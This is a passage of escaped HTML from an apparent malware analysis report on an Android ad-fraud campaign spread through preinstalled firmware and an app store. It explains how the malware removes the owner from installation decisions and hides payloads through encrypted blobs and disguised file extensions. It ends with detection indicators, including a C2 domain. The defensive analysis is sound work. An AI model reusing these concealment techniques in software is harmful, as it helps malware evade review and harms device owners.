720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe campaign has two independent distribution channels. One rides in the firmware of cheap hardware and reaches users who never chose to install anything. The other goes through the official store and reaches users who chose deliberately. Both run the same ad-fraud code against the same infrastructure. Removing either channel leaves the other intact.\u003C\u002Fp\u003E\u003Ch2 id=\"conclusions\"\u003EConclusions\u003C\u002Fh2\u003E\u003Cp\u003EPreinstalled malware is a different threat class. Every user-facing defense assumes the owner is in the loop at installation: the install prompt, the store review, Play Protect, and the ability to uninstall afterwards. \u003C\u002Fp\u003E\u003Cp\u003EA platform-signed system application holding INSTALL_PACKAGES and GRANT_RUNTIME_PERMISSIONS removes the owner from that loop entirely, and this campaign then switches off the one automated defender that remains. The compromise is complete before the phone is first switched on.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003EThe layering is in itself a defense. The APK is an empty shell. The native library is a trampoline over an encrypted blob. The framework's strings are encrypted. The plugins are JARs carrying a .o extension, and the payloads are APKs served as .png files. The modules are provisioned from a remote server, so a sample examined statically often contains no active payload at all. Detection has to see through the packaging or watch the behavior.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003EOne operator, many names. Rotating package names, signing certificates and renamed native libraries mean a package-name blocklist ages out immediately. Detection should key on the invariant core: libeasy.so and cn.kw.lib.hex, the api.weatherlive.world C2.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003ERemediation cannot rely on uninstall. Because the root component ships in the system partition, an affected owner cannot remove it by the normal route. Clearing the device requires firmware-level cleanup or disabling the component over ADB, and neither is realistic for most people who own these phones. The durable fix sits with the vendors and the marketplaces that ship and sell the affected firmware.\u003C\u002Fp\u003E\u003Ch2 id=\"indicators-of-compromise\"\u003EIndicators of
